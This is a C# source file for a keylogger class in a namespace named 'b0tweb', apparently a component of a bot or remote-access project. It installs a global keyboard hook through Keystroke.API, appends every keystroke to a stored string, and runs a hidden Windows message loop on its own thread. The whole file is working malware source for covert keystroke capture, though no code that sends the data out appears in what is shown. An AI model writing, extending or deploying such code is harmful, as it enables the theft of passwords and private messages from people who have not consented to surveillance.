using Keystroke.API;
using System;
using System.Threading;
using System.Windows.Forms;

namespace b0tweb
{
    /// <summary>
    /// Keylogger class that maintains and provides functionality over the state 
    /// of keys using the Keystroke.API
    /// </summary>
    public sealed class Keylogger
    {
        /// <summary>
        /// Thread lock for accessing the singleton.
        /// </summary>
        private static readonly object _instancelock = new object();

        /// <summary>
        /// Singleton instance of the keylogger
        /// </summary>
        private static Keylogger _instance = null;

        /// <summary>
        /// the keystroke api client
        /// </summary>
        private KeystrokeAPI _api = new KeystrokeAPI();

        private Keylogger()
        {
            this._api.CreateKeyboardHook((character) => this.Data += character);
        }

        /// <summary>
        /// Data stored by the keylogger
        /// </summary>
        public string Data { get; set; } = "";

        /// <summary>
        /// Thread safe singleton method for the keylogger
        /// </summary>
        public static Keylogger GetInstance
        {
            get
            {
                if (_instance == null)
                {
                    lock (_instancelock)
                    {
                        if (_instance == null)
                        {
                            _instance = new Keylogger();
                        }
                    }
                }
                return _instance;
            }
        }
        
        /// <summary>
        /// Method that starts running the keylogger and windows message loop in one thread
        /// </summary>
        /// <returns>the thread that the keylogger and the msg loop is in</returns>
        public static Thread Run()
        {
            Thread thread = new Thread(() =>
            {
                Keylogger logger = Keylogger.GetInstance; // instantiate the logger

                Console.WriteLine("Keylogger running!");

                Application.Run();
            }
            );

            thread.Start();

            return thread;
        }

        /// <summary>
        /// Clear the data maintained by the keylogger
        /// </summary>
        public void Clear()
        {
            this.Data = "";
        }
    }
}
